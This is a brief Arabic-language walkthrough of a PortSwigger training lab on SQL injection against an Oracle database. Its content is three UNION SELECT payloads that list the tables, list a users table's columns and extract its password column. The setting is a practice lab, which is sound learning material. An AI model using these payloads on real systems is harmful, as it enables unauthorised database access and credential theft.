# Lab: SQL injection attack, listing the database contents on Oracle

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

- الفكره من الLab ده انك تعرض المحتوي الخاص ب database بس الخاصه ب oracle

```bash
1. 'union select null,table_name from all_tables-- ==> Tables بيعرش كل 

2. 'union select null,column_name from all_tab_columns where table_name='USERS_VOZKUS'--  ==> الي انا مدهوله Table الخاصه ب  Column يعرض  

3. 'union select null,PASSWORD_FVOSQF from USERS_VOZKUS-- ==> ده column  في  tableيعرش المحتوي الخاسه ب ال
```
